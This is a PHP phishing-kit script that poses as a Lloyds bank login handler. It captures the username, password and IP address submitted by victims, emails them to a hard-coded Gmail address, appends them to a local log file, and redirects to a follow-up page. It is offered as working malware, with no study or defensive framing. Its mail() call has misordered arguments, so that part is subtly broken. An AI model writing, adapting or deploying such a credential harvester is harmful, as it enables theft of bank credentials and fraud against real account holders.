<?php
$user = $_POST['username'] ; 
$pass = $_POST['password'] ; 
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
 
$to="hfaidhmoukim@gmail.com" ; 
 
$subject = " Login Lloyd <3 : from: ".$ip;
$nome=" Login " ; 
	$from="rzlt@Lloyd.uk" ; 
	$from_mail = $nome.'<'.$from.'>';
$headers .= 'From: ' . $from_mail . "\r\n";
$message  = "------------------+ Login Fibank +-----------------\r\n";
$message .= "User: ".$user."\r\n";
$message .= "Password: " .$pass."\r\n";
$message .= "---------------+ Host Infos +---------------\r\n";
$message .= "IP Address : ".$ip."\r\n";
$message .= "-----------------+ Created By Jen +------------------\r\n";
mail($to,$subject,$from_mail,$message);
$sajal = fopen("../zarga.txt", "a");  
fwrite($sajal, $message);
header('Location: ../info.html');


?>